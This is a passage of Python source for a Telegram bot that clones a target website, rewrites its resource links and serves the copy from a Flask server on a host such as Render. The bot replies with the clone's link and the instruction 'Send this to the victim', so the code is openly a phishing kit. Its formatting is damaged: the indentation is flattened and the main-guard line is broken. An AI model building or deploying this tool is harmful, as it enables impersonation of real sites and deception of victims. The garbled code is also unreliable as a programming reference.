base_url = re.match(r'(https?://[^/]+)', url).group(0)
    for tag in soup.find_all(['link', 'script', 'img']):
        if tag.get('href') and tag['href'].startswith('/'):
            tag['href'] = base_url + tag['href']
        if tag.get('src') and tag['src'].startswith('/'):
            tag['src'] = base_url + tag['src']

    SESSIONS[slug] = {'html': str(soup), 'url': url}
    
    # This will be replaced by the actual Render URL once it builds
    host = os.environ.get('RENDER_EXTERNAL_URL', 'http://localhost:8080')
    
    bot.reply_to(message, f"✅ <b>Clone Live!</b>\n\n<code>{host}/{slug}</code>\n\nSend this to the victim.", parse_mode='HTML')

except Exception as e:
    bot.reply_to(message, f"❌ Failed: {e}")
if name == 'main':
# Start Flask in a background thread (Render uses port 10000 by default)
port = int(os.environ.get('PORT', 8080))
threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False), daemon=True).start()
# Start Telegram Bot
print("Bot is running...")
bot.infinity_polling()
